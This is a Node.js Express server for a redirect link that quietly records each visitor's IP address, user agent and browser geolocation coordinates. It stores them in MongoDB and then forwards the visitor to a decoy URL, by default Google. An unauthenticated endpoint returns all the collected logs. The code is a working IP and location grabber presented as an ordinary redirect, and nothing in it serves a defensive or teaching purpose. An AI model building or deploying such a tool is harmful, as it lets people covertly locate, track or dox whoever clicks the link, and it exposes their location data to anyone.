require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const { MongoClient } = require('mongodb');

const app = express();
const PORT = process.env.PORT || 3000;

// Configuration: Set your redirect URL here
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
const MONGODB_URI = process.env.MONGODB_URI;

// MongoDB connection
let db;
let logsCollection;

// Connect to MongoDB
async function connectToMongoDB() {
  if (!MONGODB_URI) {
    console.warn('⚠️  MONGODB_URI not set - logs will only appear in console');
    return;
  }

  try {
    const client = new MongoClient(MONGODB_URI);
    await client.connect();
    db = client.db('redirection-logs');
    logsCollection = db.collection('visitor-logs');
    console.log('✅ Connected to MongoDB - logs will be persisted');
  } catch (error) {
    console.error('❌ MongoDB connection error:', error.message);
    console.warn('⚠️  Continuing without MongoDB - logs will only appear in console');
  }
}

// Initialize MongoDB connection
connectToMongoDB();

// Middleware to parse JSON
app.use(express.json());

// Helper function to extract IP address
function getClientIP(req) {
  return req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    (req.connection.socket ? req.connection.socket.remoteAddress : null);
}

// Serve the HTML page with location request
app.get('/', (req, res) => {
  // Log IP immediately when user enters the website
  const ip = getClientIP(req);
  console.log(`👤 Visitor entered - IP: ${ip}`);

  // Read and inject REDIRECT_URL into the HTML
  let html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');

  // Replace all occurrences of google.com with the configured REDIRECT_URL
  html = html.replace(/https:\/\/www\.google\.com/g, REDIRECT_URL);

  res.send(html);
});

// API endpoint to log IP and location data
app.post('/log', async (req, res) => {
  try {
    // Get IP address (handles proxies and direct connections)
    const ip = getClientIP(req);
    const { latitude, longitude, accuracy, denied } = req.body;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const timestamp = new Date();

    // Create log entry object
    const logData = {
      ip,
      timestamp,
      userAgent,
      location: denied
        ? { status: 'DENIED' }
        : (latitude && longitude)
          ? { latitude, longitude, accuracy }
          : { status: 'NOT_AVAILABLE' },
      redirectUrl: REDIRECT_URL
    };

    // Create console log entry
    let consoleLogEntry;
    if (denied) {
      consoleLogEntry = `IP: ${ip} | Location: DENIED`;
    } else if (latitude && longitude) {
      consoleLogEntry = `IP: ${ip} | Location: ${latitude}, ${longitude}`;
    } else {
      consoleLogEntry = `IP: ${ip} | Location: NOT AVAILABLE`;
    }

    // Log to console (visible in Vercel dashboard)
    console.log(`Location is  ${consoleLogEntry}`);
    console.log(` Redirecting to: ${REDIRECT_URL}`);

    // Save to MongoDB if connected
    if (logsCollection) {
      try {
        await logsCollection.insertOne(logData);
        console.log('💾 Log saved to MongoDB');
      } catch (dbError) {
        console.error('❌ Error saving to MongoDB:', dbError.message);
      }
    } else {
      console.log('MongoDB not connected - logs will only appear in console');
    }

    // Send redirect URL back to client
    res.json({ redirectUrl: REDIRECT_URL });
  } catch (error) {
    console.error('❌ Error in /log endpoint:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API endpoint to retrieve logs (optional - for viewing logs)
app.get('/api/logs', async (req, res) => {
  try {
    if (!logsCollection) {
      return res.status(503).json({
        error: 'MongoDB not connected',
        message: 'Logs are only available in console'
      });
    }

    const limit = parseInt(req.query.limit) || 100;
    const logs = await logsCollection
      .find({})
      .sort({ timestamp: -1 })
      .limit(limit)
      .toArray();

    res.json({
      count: logs.length,
      logs
    });
  } catch (error) {
    console.error('❌ Error fetching logs:', error.message);
    res.status(500).json({ error: 'Error fetching logs' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Redirection app running on port ${PORT}`);
  console.log(`📍 Redirecting all traffic to: ${REDIRECT_URL}`);
  console.log(`📝 Logging to: ${MONGODB_URI ? 'MongoDB + Console' : 'Console only'}`);
  console.log(`\n💡 To change redirect URL, set REDIRECT_URL environment variable`);
  console.log(`   Example: REDIRECT_URL=https://example.com npm start`);
  console.log(`\n💡 To enable MongoDB logging, set MONGODB_URI environment variable\n`);
});

